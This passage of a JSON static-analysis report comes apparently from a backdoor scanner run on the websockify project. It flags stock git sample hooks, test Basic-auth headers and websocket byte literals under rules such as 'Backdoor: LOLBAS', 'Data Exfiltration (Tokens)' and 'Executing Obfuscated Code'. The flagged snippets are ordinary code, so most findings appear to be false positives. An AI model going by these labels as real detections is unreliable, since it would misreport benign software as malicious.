                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 50,
                  "startColumn": 4,
                  "endLine": 50,
                  "endColumn": 9,
                  "snippet": {
                    "text": "# the working tree, you will have to adapt your code accordingly, e.g.\n# by adding \"cd ..\" or using relative paths.\n\nif ! git update-index -q --ignore-submodules --refresh\nthen\n\tdie \"Up-to-date check failed\"\nfi\n",
                    "rendered": {
                      "text": "# the working tree, you will have to adapt your code accordingly, e.g.\n# by adding \"cd ..\" or using relative paths.\n\nif ! git update-index -q --ignore-submodules --refresh\nthen\n\tdie \"Up-to-date check failed\"\nfi\n",
                      "markdown": "`# the working tree, you will have to adapt your code accordingly, e.g.\n# by adding \"cd ..\" or using relative paths.\n\nif ! git update-index -q --ignore-submodules --refresh\nthen\n\tdie \"Up-to-date check failed\"\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 39,
                  "endLine": 37,
                  "endColumn": 44,
                  "snippet": {
                    "text": "# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n\n",
                    "rendered": {
                      "text": "# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n\n",
                      "markdown": "`# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 25,
                  "endLine": 37,
                  "endColumn": 30,
                  "snippet": {
                    "text": "# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n\n",
                    "rendered": {
                      "text": "# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n\n",
                      "markdown": "`# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 36,
                  "startColumn": 40,
                  "endLine": 36,
                  "endColumn": 45,
                  "snippet": {
                    "text": "#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n",
                    "rendered": {
                      "text": "#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n",
                      "markdown": "`#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 36,
                  "startColumn": 6,
                  "endLine": 36,
                  "endColumn": 11,
                  "snippet": {
                    "text": "#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n",
                    "rendered": {
                      "text": "#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n",
                      "markdown": "`#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 35,
                  "startColumn": 21,
                  "endLine": 35,
                  "endColumn": 26,
                  "snippet": {
                    "text": "# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n",
                    "rendered": {
                      "text": "# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n",
                      "markdown": "`# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 34,
                  "startColumn": 58,
                  "endLine": 34,
                  "endColumn": 64,
                  "snippet": {
                    "text": "# index to bring them to the desired state when the tip of the current\n# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n",
                    "rendered": {
                      "text": "# index to bring them to the desired state when the tip of the current\n# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n",
                      "markdown": "`# index to bring them to the desired state when the tip of the current\n# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 34,
                  "startColumn": 38,
                  "endLine": 34,
                  "endColumn": 43,
                  "snippet": {
                    "text": "# index to bring them to the desired state when the tip of the current\n# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n",
                    "rendered": {
                      "text": "# index to bring them to the desired state when the tip of the current\n# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n",
                      "markdown": "`# index to bring them to the desired state when the tip of the current\n# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 63,
                  "endLine": 6,
                  "snippet": {
                    "text": "\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n# tries to update the branch that is currently checked out and the\n# receive.denyCurrentBranch configuration variable is set to\n# updateInstead.\n",
                    "rendered": {
                      "text": "\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n# tries to update the branch that is currently checked out and the\n# receive.denyCurrentBranch configuration variable is set to\n# updateInstead.\n",
                      "markdown": "`\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n# tries to update the branch that is currently checked out and the\n# receive.denyCurrentBranch configuration variable is set to\n# updateInstead.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 58,
                  "endLine": 3,
                  "endColumn": 63,
                  "snippet": {
                    "text": "#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n",
                    "rendered": {
                      "text": "#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n",
                      "markdown": "`#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n",
                    "rendered": {
                      "text": "#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n",
                      "markdown": "`#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/update.sample"
                },
                "region": {
                  "startLine": 122,
                  "startColumn": 40,
                  "endLine": 122,
                  "endColumn": 48,
                  "snippet": {
                    "text": "\t\t;;\n\t*)\n\t\t# Anything else (is there anything else?)\n\t\techo \"*** Update hook: unknown type of update to ref $refname of type $newrev_type\" >&2\n\t\texit 1\n\t\t;;\nesac\n",
                    "rendered": {
                      "text": "\t\t;;\n\t*)\n\t\t# Anything else (is there anything else?)\n\t\techo \"*** Update hook: unknown type of update to ref $refname of type $newrev_type\" >&2\n\t\texit 1\n\t\t;;\nesac\n",
                      "markdown": "`\t\t;;\n\t*)\n\t\t# Anything else (is there anything else?)\n\t\techo \"*** Update hook: unknown type of update to ref $refname of type $newrev_type\" >&2\n\t\texit 1\n\t\t;;\nesac\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/update.sample"
                },
                "region": {
                  "startLine": 122,
                  "startColumn": 11,
                  "endLine": 122,
                  "endColumn": 19,
                  "snippet": {
                    "text": "\t\t;;\n\t*)\n\t\t# Anything else (is there anything else?)\n\t\techo \"*** Update hook: unknown type of update to ref $refname of type $newrev_type\" >&2\n\t\texit 1\n\t\t;;\nesac\n",
                    "rendered": {
                      "text": "\t\t;;\n\t*)\n\t\t# Anything else (is there anything else?)\n\t\techo \"*** Update hook: unknown type of update to ref $refname of type $newrev_type\" >&2\n\t\texit 1\n\t\t;;\nesac\n",
                      "markdown": "`\t\t;;\n\t*)\n\t\t# Anything else (is there anything else?)\n\t\techo \"*** Update hook: unknown type of update to ref $refname of type $newrev_type\" >&2\n\t\texit 1\n\t\t;;\nesac\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/update.sample"
                },
                "region": {
                  "startLine": 89,
                  "startColumn": 39,
                  "endLine": 89,
                  "endColumn": 44,
                  "snippet": {
                    "text": "\t\t;;\n\trefs/tags/*,tag)\n\t\t# annotated tag\n\t\tif [ \"$allowmodifytag\" != \"true\" ] && git rev-parse $refname > /dev/null 2>&1\n\t\tthen\n\t\t\techo \"*** Tag '$refname' already exists.\" >&2\n\t\t\techo \"*** Modifying a tag is not allowed in this repository.\" >&2\n",
                    "rendered": {
                      "text": "\t\t;;\n\trefs/tags/*,tag)\n\t\t# annotated tag\n\t\tif [ \"$allowmodifytag\" != \"true\" ] && git rev-parse $refname > /dev/null 2>&1\n\t\tthen\n\t\t\techo \"*** Tag '$refname' already exists.\" >&2\n\t\t\techo \"*** Modifying a tag is not allowed in this repository.\" >&2\n",
                      "markdown": "`\t\t;;\n\trefs/tags/*,tag)\n\t\t# annotated tag\n\t\tif [ \"$allowmodifytag\" != \"true\" ] && git rev-parse $refname > /dev/null 2>&1\n\t\tthen\n\t\t\techo \"*** Tag '$refname' already exists.\" >&2\n\t\t\techo \"*** Modifying a tag is not allowed in this repository.\" >&2\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/update.sample"
                },
                "region": {
                  "startLine": 34,
                  "startColumn": 21,
                  "endLine": 34,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\n# --- Safety check\nif [ -z \"$GIT_DIR\" ]; then\n\techo \"Don't run this script from the command line.\" >&2\n\techo \" (if you want, you could supply GIT_DIR then run\" >&2\n\techo \"  $0 <ref> <oldrev> <newrev>)\" >&2\n\texit 1\n",
                    "rendered": {
                      "text": "\n# --- Safety check\nif [ -z \"$GIT_DIR\" ]; then\n\techo \"Don't run this script from the command line.\" >&2\n\techo \" (if you want, you could supply GIT_DIR then run\" >&2\n\techo \"  $0 <ref> <oldrev> <newrev>)\" >&2\n\texit 1\n",
                      "markdown": "`\n# --- Safety check\nif [ -z \"$GIT_DIR\" ]; then\n\techo \"Don't run this script from the command line.\" >&2\n\techo \" (if you want, you could supply GIT_DIR then run\" >&2\n\techo \"  $0 <ref> <oldrev> <newrev>)\" >&2\n\texit 1\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/update.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to block unannotated tags from entering.\n# Called by \"git receive-pack\" with arguments: refname sha1-old sha1-new\n#\n# To enable this hook, rename this file to \"update\".\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to block unannotated tags from entering.\n# Called by \"git receive-pack\" with arguments: refname sha1-old sha1-new\n#\n# To enable this hook, rename this file to \"update\".\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to block unannotated tags from entering.\n# Called by \"git receive-pack\" with arguments: refname sha1-old sha1-new\n#\n# To enable this hook, rename this file to \"update\".\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/pre-applypatch.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to verify what is about to be committed\n# by applypatch from an e-mail message.\n#\n# The hook should exit with non-zero status after issuing an\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to verify what is about to be committed\n# by applypatch from an e-mail message.\n#\n# The hook should exit with non-zero status after issuing an\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to verify what is about to be committed\n# by applypatch from an e-mail message.\n#\n# The hook should exit with non-zero status after issuing an\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_auth_plugins.py"
                },
                "region": {
                  "startLine": 22,
                  "startColumn": 19,
                  "endLine": 22,
                  "endColumn": 27,
                  "snippet": {
                    "text": "        headers = {'Authorization': 'Basic QWxhZGRpbjpzZXNhbWUgc3RyZWV0'}\n        self.assertRaises(AuthenticationError, self.plugin.authenticate, headers, 'localhost', '1234')\n\n    def test_valid_password(self):\n        headers = {'Authorization': 'Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ=='}\n        self.plugin.authenticate(headers, 'localhost', '1234')\n\n",
                    "rendered": {
                      "text": "        headers = {'Authorization': 'Basic QWxhZGRpbjpzZXNhbWUgc3RyZWV0'}\n        self.assertRaises(AuthenticationError, self.plugin.authenticate, headers, 'localhost', '1234')\n\n    def test_valid_password(self):\n        headers = {'Authorization': 'Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ=='}\n        self.plugin.authenticate(headers, 'localhost', '1234')\n\n",
                      "markdown": "`        headers = {'Authorization': 'Basic QWxhZGRpbjpzZXNhbWUgc3RyZWV0'}\n        self.assertRaises(AuthenticationError, self.plugin.authenticate, headers, 'localhost', '1234')\n\n    def test_valid_password(self):\n        headers = {'Authorization': 'Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ=='}\n        self.plugin.authenticate(headers, 'localhost', '1234')\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_auth_plugins.py"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 21,
                  "endLine": 18,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        headers = {}\n        self.assertRaises(AuthenticationError, self.plugin.authenticate, headers, 'localhost', '1234')\n\n    def test_invalid_password(self):\n        headers = {'Authorization': 'Basic QWxhZGRpbjpzZXNhbWUgc3RyZWV0'}\n        self.assertRaises(AuthenticationError, self.plugin.authenticate, headers, 'localhost', '1234')\n\n",
                    "rendered": {
                      "text": "        headers = {}\n        self.assertRaises(AuthenticationError, self.plugin.authenticate, headers, 'localhost', '1234')\n\n    def test_invalid_password(self):\n        headers = {'Authorization': 'Basic QWxhZGRpbjpzZXNhbWUgc3RyZWV0'}\n        self.assertRaises(AuthenticationError, self.plugin.authenticate, headers, 'localhost', '1234')\n\n",
                      "markdown": "`        headers = {}\n        self.assertRaises(AuthenticationError, self.plugin.authenticate, headers, 'localhost', '1234')\n\n    def test_invalid_password(self):\n        headers = {'Authorization': 'Basic QWxhZGRpbjpzZXNhbWUgc3RyZWV0'}\n        self.assertRaises(AuthenticationError, self.plugin.authenticate, headers, 'localhost', '1234')\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_websocket.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 26,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_websocket.py"
                },
                "region": {
                  "startLine": 210,
                  "startColumn": 21,
                  "endLine": 210,
                  "endColumn": 49,
                  "snippet": {
                    "text": "    def test_encode_hybi_basic(self):\n        ws = websocket.WebSocket()\n        res = ws._encode_hybi(0x1, b'Hello')\n        expected = b'\\x81\\x05\\x48\\x65\\x6c\\x6c\\x6f'\n\n        self.assertEqual(res, expected)\n",
                    "rendered": {
                      "text": "    def test_encode_hybi_basic(self):\n        ws = websocket.WebSocket()\n        res = ws._encode_hybi(0x1, b'Hello')\n        expected = b'\\x81\\x05\\x48\\x65\\x6c\\x6c\\x6f'\n\n        self.assertEqual(res, expected)\n",
                      "markdown": "`    def test_encode_hybi_basic(self):\n        ws = websocket.WebSocket()\n        res = ws._encode_hybi(0x1, b'Hello')\n        expected = b'\\x81\\x05\\x48\\x65\\x6c\\x6c\\x6f'\n\n        self.assertEqual(res, expected)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_websocket.py"
                },
                "region": {
                  "startLine": 190,
                  "startColumn": 17,
                  "endLine": 190,
                  "endColumn": 37,
                  "snippet": {
